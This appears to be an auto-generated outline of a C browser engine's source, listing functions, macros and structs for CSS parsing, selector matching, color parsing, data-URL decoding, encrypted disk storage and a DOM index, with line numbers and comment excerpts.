- `interp_touch_action` (line 1721) `static int interp_touch_action(const char *v)` - *static int interp_resize(const char *v) { if (csel_ci_eq(v, "none"))        return CSS_RS_NONE; if (csel_ci_eq(v, "both"))        return CSS_RS_BOTH; if (csel_ci_eq(v, "horizontal"))  return CSS_RS_HORIZONTAL; if (csel_ci_eq(v, "vertical"))    return CSS_RS_VERTICAL; return -1; } /* scroll-behavior: auto/smooth. -1 unknown. static int interp_scroll_behavior(const char *v) { if (csel_ci_eq(v, "auto"))   return CSS_SB_AUTO; if (csel_ci_eq(v, "smooth")) return CSS_SB_SMOOTH; return -1; } /* touch-action: auto/none/manipulation. -1 unknown.*
- `interp_overscroll_behavior` (line 1728) `static int interp_overscroll_behavior(const char *v)` - */* scroll-behavior: auto/smooth. -1 unknown. static int interp_scroll_behavior(const char *v) { if (csel_ci_eq(v, "auto"))   return CSS_SB_AUTO; if (csel_ci_eq(v, "smooth")) return CSS_SB_SMOOTH; return -1; } /* touch-action: auto/none/manipulation. -1 unknown. static int interp_touch_action(const char *v) { if (csel_ci_eq(v, "auto"))         return CSS_TA_AUTO; if (csel_ci_eq(v, "none"))         return CSS_TA_NONE; if (csel_ci_eq(v, "manipulation")) return CSS_TA_MANIPULATION; return -1; } /* overscroll-behavior: auto/contain/none. -1 unknown.*
- `interp_backface_visibility` (line 1735) `static int interp_backface_visibility(const char *v)` - *static int interp_touch_action(const char *v) { if (csel_ci_eq(v, "auto"))         return CSS_TA_AUTO; if (csel_ci_eq(v, "none"))         return CSS_TA_NONE; if (csel_ci_eq(v, "manipulation")) return CSS_TA_MANIPULATION; return -1; } /* overscroll-behavior: auto/contain/none. -1 unknown. static int interp_overscroll_behavior(const char *v) { if (csel_ci_eq(v, "auto"))    return CSS_OS_AUTO; if (csel_ci_eq(v, "contain")) return CSS_OS_CONTAIN; if (csel_ci_eq(v, "none"))    return CSS_OS_NONE; return -1; } /* backface-visibility: visible/hidden. -1 unknown.*
- `interp_border_style` (line 1757) `static int interp_border_style(const char *v)`
- `interp_bwidth1` (line 1783) `static int interp_bwidth1(const char *v)`
- `interp_border_radius` (line 1791) `static int interp_border_radius(const char *v)` - *border-radius: the first value only (corner-by-corner / elliptical out of scope). * px >= 0, or -1 (unsupported: %/units dropped -> stays unset).*
- `interp_bw_tok` (line 1805) `static int interp_bw_tok(const char *t, int *o)` - *static int interp_border_radius(const char *v) { char tok[CSS_TOK_MAX]; size_t k = 0; const char *p = v; while (*p == ' ' || *p == '\t') ++p; while (*p != '\0' && *p != ' ' && *p != '\t' && *p != '/' && k + 1 < sizeof tok) tok[k++] = *p++; tok[k] = '\0'; int px; if (!interp_len(tok, 0, &px) || px < 0) return -1; return px; } /* token classifiers for the per-category border-{width,style,color} quad expanders.*
- `interp_bs_tok` (line 1806) `static int interp_bs_tok(const char *t, int *o)`
- `interp_bc_tok` (line 1807) `static int interp_bc_tok(const char *t, int *o)`
- `expand_outline` (line 1871) `static int expand_outline(const char *val, css_decl *dst, int cap)`
- `expand_box_shadow` (line 1886) `static int expand_box_shadow(const char *val, css_decl *dst, int cap)` - *box-shadow (single layer): up to four lengths in order dx, dy, blur, spread, an optional color, and an optional `inset` keyword, in any order. Needs >= 2 lengths (dx, dy) or the whole declaration is dropped (fail closed). `none` is an explicit * no-shadow. url() dropped: never fetch. Writes the six contiguous P_BSHADOW_* slots.*
- `interp_flex_factor` (line 1914) `static int interp_flex_factor(const char *v)` - *flex-grow / flex-shrink: a non-negative number stored x100 (0.5 -> 50), clamped to * [0, CSS_FLEX_FACTOR_MAX]. Negative / unparseable -> -1 (dropped, stays unset).*
- `expand_flex` (line 1935) `static int expand_flex(const char *val, css_decl *dst, int cap)` - *flex shorthand -> the three contiguous P_FLEX_GROW/SHRINK/BASIS slots. Keywords none/auto/initial; otherwise up to three values (a unitless number is grow then shrink; a length/auto is basis). Defaults: shrink 1, basis 0 when a grow is given, * else basis auto.*
- `interp_align_kw` (line 1975) `static int interp_align_kw(const char *v, int allow_auto, int allow_dist)` - *align-items / align-self / align-content / justify-items keyword. allow_auto is for * align-self; allow_dist (space-*) is for align-content. Unknown -> -1 (drop).*
- `interp_flex_direction` (line 1987) `static int interp_flex_direction(const char *v)`
- `interp_flex_wrap` (line 1995) `static int interp_flex_wrap(const char *v)`
- `interp_grid_flow` (line 2004) `static int interp_grid_flow(const char *v)` - *if (csel_ci_eq(v, "row-reverse")) return CSS_FD_ROW_REVERSE; if (csel_ci_eq(v, "column")) return CSS_FD_COLUMN; if (csel_ci_eq(v, "column-reverse")) return CSS_FD_COLUMN_REVERSE; return -1; } static int interp_flex_wrap(const char *v) { if (csel_ci_eq(v, "nowrap")) return CSS_FW_NOWRAP; if (csel_ci_eq(v, "wrap")) return CSS_FW_WRAP; if (csel_ci_eq(v, "wrap-reverse")) return CSS_FW_WRAP_REVERSE; return -1; } /* grid-auto-flow: the first row/column axis keyword wins; `dense` ignored.*
- `interp_grid_span` (line 2030) `static int interp_grid_span(const char *v)` - *grid-column / grid-row: only the `span N` form is supported -> N (clamped to * [1, CSS_GRID_SPAN_MAX]). Line-number / named-line placement is out of scope (-1).*
- `copy_trim` (line 2049) `static size_t copy_trim(const char *s, size_t a, size_t b, char *dst, size_t cap)` - *Copies s[a,b) into dst (bounded, NUL-terminated), trimming ASCII whitespace from * both ends. Returns the trimmed length, or SIZE_MAX if it does not fit dst.*
- `strip_important` (line 2062) `static int strip_important(char *val)` - *Strips a trailing "!important" (case-insensitive, with optional whitespace before '!' and between '!' and the keyword) from val, in place. Returns 1 if found. A '!' * that does not begin "!important" is left intact (the value will fail to interpret).*
- `var_append` (line 2143) `static int var_append(char *out, size_t outcap, size_t *o, const char *s, size_t n)` - *} } i = v; continue; } } ++i; } } static int resolve_var_rec(const char *val, size_t vlen, char *out, size_t outcap, size_t *o, const css_custom_prop *tab, size_t ntab, int depth); /* Appends s[0,n) to out at *o; fails (0) if it would not fit outcap.*
- `value` (line 2170) `* any other unsupported value (fail closed, never a partially-substituted value). */
static int r...`
- `overflowed` (line 2230) `* overflowed (caller drops the declaration). */
static int resolve_var(const char *val, char *out...`
- `parse_rotate_deg` (line 2264) `static int parse_rotate_deg(const char *s, int *out)` - *rotate() argument: a signed WHOLE-DEGREE angle, "deg" suffix mandatory -- same convention as the linear-gradient direction grammar (grad_direction above): rad/turn/grad and fractional degrees are unsupported, fail closed. Not normalized mod 360 (a static rotation of e.g. 720deg is visually * identical to 0deg once fed through cos/sin at paint time).*
- `expand_transform` (line 2293) `static int expand_transform(const char *val, css_decl *dst, int cap)` - *transform function (skew/matrix/perspective/3D), multiple space-separated functions, or unparseable syntax reject the WHOLE declaration (no decl emitted -> cascades as unset, byte-identical to a page that never declared transform at all -- fail closed, never a half-applied transform). skew()/ matrix() are architecturally deferred: they need an arbitrary (non-pivotable or fully general) Cairo matrix, out of scope for this increment (see spec/compositor.md "fuera de alcance"). Transformed hit-testing (click, cursor, overflow-clip ancestor resolution) also stays out of scope -- the painter (gui/browser_ui.c box_transform_matrix) applies the real affine transform, but hit-testing still resolves against the UNTRANSFORMED layout rect, same documented limit as M1.2 translate. transform-origin is not parsed; the pivot is always the box's own center. "none" is not special-cased -- it simply fails every function-name match below and emits * nothing, same net effect (unset).*
- `expand_gap` (line 2394) `static int expand_gap(const char *val, css_decl *dst, int cap)` - *gap / grid-gap (2026-07-10): one value keeps the pre-existing semantics (both axes; row-gap stays unset and falls back to gap downstream), two values are `<row> <col>` (row feeds row-gap, col feeds gap). column-gap stays a * single-value longhand in the dispatch below.*
- `ignored` (line 2413) `* engine slot and is ignored (documented simplification, like list-style's
 * ignored tokens). An...`
- `shorthand` (line 2450) `* generic bucket keeps the rest of the shorthand (same net effect as the
 * font-family longhand ...`
- `caller` (line 2507) `* left to the caller (parse_one_decl stamps it). */
static int interpret_prop(const char *prop, c...`
- `interpret_decls` (line 2800) `static size_t interpret_decls(const char *s, size_t n, css_decl *dst, size_t cap,
               ...` - *Splits a ';'-separated declaration block into dst (up to cap). Returns count. tab/ntab is the custom-property table var() resolves against (NULL/0 when none, * e.g. an inline style resolved against a NULL sheet).*
- `add_rule` (line 2813) `static void add_rule(css_sheet *sh, const char *s, size_t ss, size_t se,
                     siz...` - *e.g. an inline style resolved against a NULL sheet). static size_t interpret_decls(const char *s, size_t n, css_decl *dst, size_t cap, const css_custom_prop *tab, size_t ntab) { size_t count = 0, i = 0; while (i < n && count < cap) { size_t j = i; while (j < n && s[j] != ';') ++j; count += (size_t)parse_one_decl(s + i, j - i, &dst[count], (int)(cap - count), tab, ntab); i = (j < n) ? j + 1 : j; } return count; } /* Adds a rule: selector list s[ss,se), declaration block s[ds,de).*
- `skip_at_rule` (line 2849) `static size_t skip_at_rule(const char *s, size_t i, size_t n)` - *Skips an @-rule starting at s[i] ('@'): to the terminating ';' or past a * brace-balanced block. Returns the index just past it.*
- `block_end` (line 2865) `static size_t block_end(const char *s, size_t open, size_t n)` - *Index just past the '}' that closes the block whose '{' is at s[open]. n if * unbalanced.*
- `trim_inplace` (line 2887) `static void trim_inplace(char *s)` - *-- @media query evaluation (Hito 23b). All inputs are bounded substrings; the * query never fetches and unknown features fail closed (do not match). --- #define CSS_MEDIA_TOK 128u /* Leading non-negative integer of a length value ("600px" -> 600), unit ignored. static int css_px(const char *v) { double d; const char *e; return parse_num(v, &d, &e) ? round_clamp(d, 0, CSS_LEN_MAX) : 0; } /* Trims ASCII spaces/tabs from both ends of a NUL-terminated string, in place.*
- `copy_lower_trim` (line 2896) `static size_t copy_lower_trim(const char *s, size_t a, size_t b, char *dst, size_t cap)` - *const char *e; return parse_num(v, &d, &e) ? round_clamp(d, 0, CSS_LEN_MAX) : 0; } /* Trims ASCII spaces/tabs from both ends of a NUL-terminated string, in place. static void trim_inplace(char *s) { size_t a = 0; while (s[a] == ' ' || s[a] == '\t') ++a; size_t n = strlen(s + a); memmove(s, s + a, n + 1); while (n > 0 && (s[n-1] == ' ' || s[n-1] == '\t')) s[--n] = '\0'; } /* Lowercased, trimmed copy of s[a,b) into dst; SIZE_MAX if it does not fit.*
- `media_part_matches` (line 2905) `static int media_part_matches(const char *p, const css_media *m)` - *One media part: a type word ("screen"/"print"/"all") or a "(feature: value)". * p is already lowercased and trimmed. Unknown -> 0 (fail closed).*
- `media_segment_matches` (line 2934) `static int media_segment_matches(const char *s, size_t a, size_t b, const css_media *m)` - *One media query segment (between commas): an AND of parts. `not`/`or`/unknown * fail closed. An empty segment matches (all).*
- `media_matches` (line 2971) `static int media_matches(const char *s, size_t a, size_t b, const css_media *m)` - *if (strcmp(buf, "and") == 0 || strcmp(buf, "only") == 0) { /* connector / legacy keyword: ignore } else if (strcmp(buf, "not") == 0 || strcmp(buf, "or") == 0) { return 0;  /* negation / level-4 or: fail closed } else { if (!media_part_matches(buf, m)) result = 0; any = 1; } } } return any ? result : 1; } /* A media query list s[a,b): comma-separated segments OR'd together.*
- `at_is_media` (line 2985) `static int at_is_media(const char *s, size_t i, size_t n)` - *static int media_matches(const char *s, size_t a, size_t b, const css_media *m) { while (a < b && (s[a] == ' ' || s[a] == '\t' || s[a] == '\n' || s[a] == '\r')) ++a; if (a >= b) return 1;  /* empty query == all size_t i = a; while (i < b) { size_t seg = i; while (i < b && s[i] != ',') ++i; if (media_segment_matches(s, seg, i, m)) return 1; if (i < b) ++i; } return 0; } /* True when s[i] ('@') begins an "@media" at-rule.*
- `parse_block` (line 2998) `static void parse_block(css_sheet *sh, const char *s, size_t start, size_t end,
                 ...` - *Parses rules in s[start,end). A matched @media block is descended into (bounded * depth); @import/@font-face/other @-rules and a non-matching @media are skipped.*
- `strip_comments` (line 3040) `static char *strip_comments(const char *text, size_t len, size_t *outlen)` - *Removes C-style block comments into a fresh NUL-terminated buffer (each comment * becomes one space). Caller frees.*
- `css_parse` (line 3059) `css_status css_parse(const char *text, size_t len, css_sheet **out)`
- `css_parse_media` (line 3063) `css_status css_parse_media(const char *text, size_t len, const css_media *media,
                ...`
- `css_free` (line 3083) `void css_free(css_sheet *s)`
- `apply_decl` (line 3093) `static void apply_decl(css_style *o, int *wi, int *ws, int *wo, const css_decl *d,
              ...` - *Applies one declaration to the running style if it wins its property slot. The cascade is two-tiered: an !important declaration beats any non-important one (regardless of specificity); within a tier the higher specificity wins, ties * broken by document order. wi/ws/wo track the winning tier/specificity/order so far.*
- `css_resolve_el` (line 3257) `css_style css_resolve_el(const css_sheet *sheet, const css_element *el,
                         ...`
- `css_resolve` (line 3383) `css_style css_resolve(const css_sheet *sheet, const char *tag, const char *id,
                  ...`
- `css_parse_inline` (line 3394) `css_style css_parse_inline(const char *style, size_t len)`

**Macros:**
- `CSS_MAX_SELS` (line 34)
- `CSS_MAX_DECLS` (line 35)
- `CSS_MAX_RULES` (line 36)
- `CSS_SELS_PER_GROUP` (line 37)
- `CSS_INLINE_DECLS` (line 38)
- `CSS_INLINE_SPEC` (line 39)
- `CSS_MAX_CUSTOM_PROPS` (line 50)
- `CSS_VAR_MAX_DEPTH` (line 51)
- `CSS_CALC_MAX_DEPTH` (line 726)
- `CSS_MATHFN_MAX_ARGS` (line 730)
- `CSS_MEDIA_TOK` (line 2876)
- `CSS_MEDIA_MAX_DEPTH` (line 2993)

**Structs:**
- `css_decl` (line 115)
- `css_custom_prop` (line 123) - *One custom property (--name: value), for var() lookups. Both fields are bounded * like every other token buffer here.*
- `css_sheet` (line 131)
- `calc_val` (line 732)
- `calc_parser` (line 733)

#### `css_chain.c`
**Path:** `src/css_chain.c`

**Functions:**
- `fill_css_node` (line 35) `static void fill_css_node(lxb_dom_element_t *e, cch_node *node)` - *Fills *node with element e's tag/id/class tokens (no style=, no parent link yet). * Over-long tokens are simply absent, which fails closed (does not match).*
- `sibling_position` (line 116) `static void sibling_position(lxb_dom_node_t *n, int *nth, int *nsib)` - *Computes the 1-based index of n among its ELEMENT siblings and the total element-sibling count (both walks bounded, anti-DoS: past CCH_NTH_MAX the * position reads unknown and :nth-child()-style selectors do not match).*
- `inputs` (line 139) `* identical inputs (single source of truth). */
static const css_element *build_chain(lxb_dom_ele...`
- `cch_element_matches` (line 195) `int cch_element_matches(lxb_dom_element_t *el, const css_sel *sel)`

**Macros:**
- `CCH_TAG_MAX` (line 14)
- `CCH_ID_MAX` (line 15)
- `CCH_CLASS_BUF` (line 16)
- `CCH_MAX_CLASSES` (line 17)
- `CCH_MAX_ATTRS` (line 18)
- `CCH_ATTR_BUF` (line 19)

**Structs:**
- `cch_node` (line 23) - *One element's selector inputs (tag/id/classes) plus its css_element view, with * backing storage so the css_element pointers stay valid for the chain's lifetime.*

#### `css_color.c`
**Path:** `src/css_color.c`

**Functions:**
- `ascii_lower` (line 108) `static int ascii_lower(int c)`
- `hex_val` (line 112) `static int hex_val(int c)`
- `normalize` (line 122) `static int normalize(const char *token, char *out)` - *Trims surrounding ASCII spaces and lowercases into out (CC_TOKEN_MAX bytes). * Returns 0, or -1 if the trimmed token is empty or does not fit.*
- `parse_hex` (line 136) `static int parse_hex(const char *s, cc_rgb *out)` - *static int normalize(const char *token, char *out) { size_t start = 0; while (token[start] == ' ' || token[start] == '\t') ++start; size_t end = strlen(token); while (end > start && (token[end - 1] == ' ' || token[end - 1] == '\t')) --end; size_t len = end - start; if (len == 0 || len >= CC_TOKEN_MAX) return -1; for (size_t i = 0; i < len; ++i) out[i] = (char)ascii_lower((unsigned char)token[start + i]); out[len] = '\0'; return 0; } /* Parses the hex body (after '#'), lowercased. Returns 0 / -1.*
- `parse_component` (line 162) `static int parse_component(const char *b, const char *e, int is_alpha, int *out)` - *Parses one rgb() component in [b, e). For a color channel, the value is an integer 0..255 or a percentage 0%..100% (rounded). For the alpha channel * (is_alpha), the value is validated as numeric and discarded. Returns 0 / -1.*
- `parse_hsl_comp` (line 197) `static int parse_hsl_comp(const char *b, const char *e, int is_hue, int *out)` - *Parses one hsl() component: H is integer 0..360, S/L are 0%..100%. * Returns 0 / -1.*
- `parse_func` (line 271) `static int parse_func(const char *s, cc_rgb *out)` - *Parses the functional rgb()/rgba()/hsl()/hsla() form (lowercased token). * Returns 0 / -1.*
- `named_cmp` (line 340) `static int named_cmp(const void *key, const void *element)`
- `parse_named` (line 346) `static int parse_named(const char *s, cc_rgb *out)`
- `cc_parse` (line 356) `cc_status cc_parse(const char *token, cc_rgb *out)`
- `cc_pack` (line 387) `int cc_pack(cc_rgb c)`
- `cc_unpack` (line 391) `cc_rgb cc_unpack(int packed)`

**Macros:**
- `CC_TOKEN_MAX` (line 18)
- `CC_CHANNEL_MAX` (line 21)
- `CC_PERCENT_MAX` (line 22)

**Structs:**
- `cc_named` (line 24)

#### `css_select.c`
**Path:** `src/css_select.c`

**Functions:**
- `parse_attr_sel` (line 16) `static int parse_attr_sel(const char *s, size_t *ip, size_t b, css_attr_match *am)` - *Parses one attribute selector starting at s[*ip] == '[' (within s[.,b)) into *am. Advances *ip past the closing ']'. Returns 1 if supported, 0 (fail closed) on any malformation (no name, unknown operator, unterminated). Grammar: '[' ws name ws ( ']' | op '=' ws value ws (i|s)? ws ']' ) * value may be quoted (single/double; quotes stripped, may contain whitespace).*
- `parse_nth_arg` (line 73) `static int parse_nth_arg(const char *s, size_t a, size_t b, int *A, int *B)` - *Parses the An+B argument of the nth-child family, s[a,b) (surrounding space trimmed here). Accepts odd/even, N, An, An+B, An-B, n, -n+B, +n... (spaces around the +/- of the B part allowed, case-insensitive n). |A| and |B| are * bounded by CSS_NTH_MAX; anything else fails (drops the selector).*
- `parse_sub_compound` (line 227) `static int parse_sub_compound(const char *s, size_t a, size_t b, css_sub_sel *sub)` - *Parses one SIMPLE sub-selector span s[a,b) for :not()/:is()/:where(): only tag name, .class, #id, or [attr] (no pseudo-classes, no combinators). The caller MUST trim leading/trailing space. Returns 1 if any component was * parsed; 0 means the span is empty or junk (fail closed for that alternative).*
- `parse_compound` (line 278) `static int parse_compound(const char *s, size_t a, size_t b, css_compound *cp,
                  ...` - *Parses one COMPOUND selector span s[a,b) (no combinators, no surrounding space) into *cp. sel holds the sub-selector storage for :not()/:is()/:where() * pseudo-classes being parsed. Returns 1 if supported.*
- `selector` (line 337) `* the whole selector (fail closed). A chain deeper than CSS_MAX_COMPOUNDS is
 * dropped. Whitespa...`
- `el_attr_value` (line 431) `static const char *el_attr_value(const css_element *el, const char *name)` - *The value of element attribute `name` (case-insensitive name), or NULL if absent. * A present attribute with no value reads as "".*
- `ends_with` (line 441) `static int ends_with(const char *v, const char *suf, int ci)` - *The value of element attribute `name` (case-insensitive name), or NULL if absent. * A present attribute with no value reads as "". static const char *el_attr_value(const css_element *el, const char *name) { if (el->attrs == NULL) return NULL; for (size_t i = 0; i < el->nattrs; ++i) { if (el->attrs[i].name != NULL && csel_ci_eq(el->attrs[i].name, name)) return el->attrs[i].value != NULL ? el->attrs[i].value : ""; } return NULL; } /* True if `v` ends with `suf` (non-empty), case-folded when ci.*
- `has_word` (line 449) `static int has_word(const char *v, const char *w, int ci)` - *True if `v` is a whitespace-separated list containing the word `w` (non-empty), * case-folded when ci (the `~=` operator).*
- `attr_matches` (line 464) `static int attr_matches(const css_attr_match *am, const css_element *el)` - *size_t wl = strlen(w); if (wl == 0) return 0; const char *p = v; while (*p != '\0') { while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r' || *p == '\f') ++p; const char *st = p; while (*p != '\0' && *p != ' ' && *p != '\t' && *p != '\n' && p != '\r' && *p != '\f') ++p; if ((size_t)(p - st) == wl && csel_span_eq(st, w, wl, ci)) return 1; } return 0; } /* True if attribute selector `am` matches element `el`.*
- `nth_matches` (line 484) `static int nth_matches(int A, int B, int idx)` - *True if the 1-based index idx satisfies idx = A*m + B for some integer m >= 0. * idx <= 0 means "unknown sibling position" and never matches (fail closed).*
- `is_form_control` (line 493) `static int is_form_control(const char *tag)` - *True if the 1-based index idx satisfies idx = A*m + B for some integer m >= 0. * idx <= 0 means "unknown sibling position" and never matches (fail closed). static int nth_matches(int A, int B, int idx) { if (idx <= 0) return 0; if (A == 0) return idx == B; long d = (long)idx - B; if (A > 0) return d >= 0 && d % A == 0; return d <= 0 && (-d) % (long)(-A) == 0; } /* Form controls for :enabled (per HTML: elements that can actually be disabled).*
- `sub_sel_matches` (line 502) `static int sub_sel_matches(const css_sub_sel *sub, const css_element *el)` - *if (A > 0) return d >= 0 && d % A == 0; return d <= 0 && (-d) % (long)(-A) == 0; } /* Form controls for :enabled (per HTML: elements that can actually be disabled). static int is_form_control(const char *tag) { if (tag == NULL) return 0; return csel_ci_eq(tag, "input") || csel_ci_eq(tag, "button") || csel_ci_eq(tag, "select") || csel_ci_eq(tag, "textarea") || csel_ci_eq(tag, "option") || csel_ci_eq(tag, "optgroup") || csel_ci_eq(tag, "fieldset"); } /* True if a css_sub_sel (tag/class/id/[attr]) matches element el.*
- `compound_matches` (line 571) `static int compound_matches(const css_compound *c, const css_element *el,
                       ...` - *case PSEUDO_IS: case PSEUDO_WHERE: if (sel == NULL || pm->sub_first < 0) return 0; for (int si = 0; si < pm->sub_count; ++si) { int idx = pm->sub_first + si; if (idx < sel->nsubs && sub_sel_matches(&sel->subs[idx], el)) return 1;  /* any sub-selector matches → succeed } return 0;  /* none matched default:                  return 0; } } /* True if one compound matches one element (no ancestor context).*
- `sibling` (line 595) `* tries each preceding sibling (the recursion backtracks). Bounded by k
 * (<= CSS_MAX_COMPOUNDS)...`
- `csel_matches` (line 616) `int csel_matches(const css_sel *sel, const css_element *el)`

#### `data_url.c`
**Path:** `src/data_url.c`

**Functions:**
- `lower` (line 15) `static int lower(char c)` - *include <stdlib.h> include <string.h>*
- `ci_starts_with` (line 19) `static int ci_starts_with(const char *s, const char *prefix)`
- `du_is_data_url` (line 27) `int du_is_data_url(const char *url)`
- `du_base64_payload` (line 31) `du_status du_base64_payload(const char *url, const char **payload, size_t *payload_len)`
- `b64_val` (line 61) `static int b64_val(unsigned char c)` - *0-63 for a base64 alphabet character, -1 otherwise. Kept as a small function * (not a 256-entry table) so the mapping stays trivially auditable.*
- `du_base64_decode` (line 69) `du_status du_base64_decode(const char *b64, size_t b64_len, uint8_t **out, size_t *out_len)`

#### `disk_store.c`
**Path:** `src/disk_store.c`

**Functions:**
- `fsync_dir` (line 32) `static void fsync_dir(const char *path)` - *Best-effort fsync of the directory holding path, for crash durability of the * rename. Failures are non-fatal (some filesystems do not support it).*
- `map_ls` (line 49) `static ds_status map_ls(ls_status s)`
- `ds_write` (line 65) `ds_status ds_write(const char *path, const uint8_t key[LS_KEY_LEN], ls_aead aead,
               ...` - *switch (s) { case LS_OK:            return DS_OK; case LS_ERR_NULL_ARG:  return DS_ERR_NULL_ARG; case LS_ERR_TOO_LARGE: return DS_ERR_TOO_LARGE; case LS_ERR_FORMAT:    return DS_ERR_FORMAT; case LS_ERR_AUTH:      return DS_ERR_AUTH; case LS_ERR_OOM:       return DS_ERR_OOM; case LS_ERR_KDF: case LS_ERR_CRYPTO: default:               return DS_ERR_CRYPTO; } } /* --- public ---*
- `ds_read` (line 102) `ds_status ds_read(const char *path, const uint8_t key[LS_KEY_LEN],
                  uint8_t **ou...`
- `ds_free` (line 135) `void ds_free(uint8_t *buf, size_t len)`

**Macros:**
- `_POSIX_C_SOURCE` (line 10)

#### `dom.c`
**Path:** `src/dom.c`

**Functions:**
- `to_lower_buf` (line 33) `static int to_lower_buf(const char *s, size_t n, char *out, size_t outcap)` - *#include <stdint.h> #include <stdlib.h> #include <string.h> #include <lexbor/dom/dom.h> #include <lexbor/html/html.h> /* --- small character helpers (no locale dependence) --- static int is_ws(int c) { return c == ' ' || c == '\t' || c == '\n' || c == '\f' || c == '\r'; } /* Lowercase s[0..n) into out (NUL-terminated). Fails if it would not fit.*
- `ptr_hash` (line 43) `static size_t ptr_hash(const void *p)`
- `sm_entry_append` (line 69) `static int sm_entry_append(sm_entry *e, dom_node_id id)`
- `sm_grow` (line 81) `static int sm_grow(strmap *m)`
- `sm_put` (line 98) `static int sm_put(strmap *m, const char *key, size_t klen, dom_node_id id)`
- `sm_find` (line 126) `static const sm_entry *sm_find(const strmap *m, const char *key, size_t klen)`
- `sm_free` (line 138) `static void sm_free(strmap *m)`
- `pm_grow` (line 165) `static int pm_grow(ptrmap *m)`
- `pm_put` (line 182) `static int pm_put(ptrmap *m, const void *key, dom_node_id id)`
- `pm_get` (line 199) `static int pm_get(const ptrmap *m, const void *key, dom_node_id *out)`
- `pm_free` (line 210) `static void pm_free(ptrmap *m)`
- `node_next` (line 232) `static lxb_dom_node_t *node_next(lxb_dom_node_t *node, const lxb_dom_node_t *root)` - */* --- the index --- struct dom_index { lxb_dom_node_t      **nodes;    /* arena: id -> element node, in document order size_t                count; size_t                cap;      /* capacity of nodes[] (grows when JS creates nodes) lxb_dom_document_t   *document; /* owning document (for title / text-node creation) strmap                by_id; strmap                by_tag; strmap                by_class; ptrmap                rev;      /* node pointer -> id }; /* Iterative pre-order successor within the subtree rooted at root.*
- `valid` (line 241) `static int valid(const dom_index *idx, dom_node_id n)`
- `index_element` (line 247) `static int index_element(dom_index *idx, lxb_dom_element_t *el, dom_node_id id)` - *if (node->first_child != NULL) return node->first_child; while (node != root && node->next == NULL) { if (node->parent == NULL) return NULL; node = node->parent; } if (node == root) return NULL; return node->next; } static int valid(const dom_index *idx, dom_node_id n) { return idx != NULL && n < idx->count; } /* Index a single element's id, class tokens and tag name.*
- `dom_build` (line 283) `dom_status dom_build(const hp_document *doc, dom_index **out)` - *} size_t tlen = 0; const lxb_char_t *tag = lxb_dom_element_qualified_name(el, &tlen); if (tag != NULL && tlen > 0) { char lower[256]; if (to_lower_buf((const char *)tag, tlen, lower, sizeof lower) == 0) { if (sm_put(&idx->by_tag, lower, tlen, id) != 0) return -1; } } return 0; } /* --- public: build / free ---*
- `dom_free` (line 324) `void dom_free(dom_index *idx)`
- `dom_node_count` (line 336) `size_t dom_node_count(const dom_index *idx)` - *return DOM_ERR_OOM; } void dom_free(dom_index *idx) { if (idx == NULL) return; free(idx->nodes); sm_free(&idx->by_id); sm_free(&idx->by_tag); sm_free(&idx->by_class); pm_free(&idx->rev); free(idx); } /* --- public: queries ---*
- `dom_get_element_by_id` (line 340) `dom_node_id dom_get_element_by_id(const dom_index *idx, const char *id)`
- `copy_ids` (line 346) `static size_t copy_ids(const sm_entry *e, dom_node_id *out, size_t cap)`
- `dom_get_by_tag` (line 353) `size_t dom_get_by_tag(const dom_index *idx, const char *tag,
                      dom_node_id *o...`
- `dom_get_by_class` (line 362) `size_t dom_get_by_class(const dom_index *idx, const char *cls,
                        dom_node_i...`
- `id_of` (line 376) `static dom_node_id id_of(const dom_index *idx, const lxb_dom_node_t *node)` - *Max complex selectors in one comma-separated list. A longer list is truncated * (anti-DoS): the extra selectors are dropped, which only narrows matches. #define DOM_QS_MAX_SELECTORS 16 /* Reverse lookup: node pointer -> handle, or DOM_NODE_NONE if unindexed.*
- `parse_selector_list` (line 386) `static size_t parse_selector_list(const char *sel, css_sel *out, size_t cap)` - *Parses a selector list "a, b, c" into up to cap css_sel. Splits only on TOP-LEVEL commas (respecting [], () and quotes so `[a="x,y"]` and `:not(a,b)` do not split); each complex selector goes through csel_parse and an unsupported/malformed one is dropped (fail closed) while the rest survive. * Returns the number parsed.*
- `node_matches_any` (line 419) `static int node_matches_any(const lxb_dom_node_t *cn,
                            const css_sel *...` - *s.order = (int)n; s.rule = 0; out[n++] = s; } } start = i + 1; } break; default: break; } } return n; } /* Nonzero iff element node `cn` matches any selector in the parsed list.*
- `count` (line 430) `* count (may exceed cap), and returns DOM_NODE_NONE. */
static dom_node_id qs_walk(const dom_inde...`
- `dom_query_selector` (line 459) `dom_node_id dom_query_selector(const dom_index *idx, dom_node_id root,
                          ...`
- `dom_query_selector_all` (line 468) `size_t dom_query_selector_all(const dom_index *idx, dom_node_id root,
                           ...`
- `dom_matches` (line 479) `int dom_matches(const dom_index *idx, dom_node_id node, const char *selector)`
- `dom_closest` (line 488) `dom_node_id dom_closest(const dom_index *idx, dom_node_id node,
                        const cha...`
- `dom_document_position` (line 504) `size_t dom_document_position(const dom_index *idx, dom_node_id node)`
- `dom_precedes` (line 509) `int dom_precedes(const dom_index *idx, dom_node_id a, dom_node_id b)`
- `dom_node_at` (line 514) `dom_node_id dom_node_at(const dom_index *idx, size_t position)`
- `dom_parent` (line 519) `dom_node_id dom_parent(const dom_index *idx, dom_node_id node)`
- `dom_first_child` (line 529) `dom_node_id dom_first_child(const dom_index *idx, dom_node_id node)`
- `dom_next_sibling` (line 537) `dom_node_id dom_next_sibling(const dom_index *idx, dom_node_id node)`
- `dom_tag_name` (line 545) `const char *dom_tag_name(const dom_index *idx, dom_node_id node, size_t *len)`
- `dom_get_attribute` (line 556) `const char *dom_get_attribute(const dom_index *idx, dom_node_id node,
                           ...`
- `dom_attribute_names` (line 578) `size_t dom_attribute_names(const dom_index *idx, dom_node_id node,
                           con...`
- `dom_text_content` (line 596) `const char *dom_text_content(const dom_index *idx, dom_node_id node, size_t *len)`
- `dom_document_title` (line 606) `const char *dom_document_title(const dom_index *idx, size_t *len)`
- `dom_set_text_content` (line 619) `dom_status dom_set_text_content(dom_index *idx, dom_node_id node,
                               ...` - *} const char *dom_document_title(const dom_index *idx, size_t *len) { if (len != NULL) *len = 0; if (idx == NULL || idx->document == NULL) return NULL; size_t tl = 0; const lxb_char_t *t = lxb_html_document_title((lxb_html_document_t *)idx->document, &tl); if (t == NULL) return NULL; if (len != NULL) *len = tl; return (const char *)t; } /* --- mutation (live JS) ---*
- `dom_set_document_title` (line 644) `dom_status dom_set_document_title(dom_index *idx, const char *text, size_t len)`
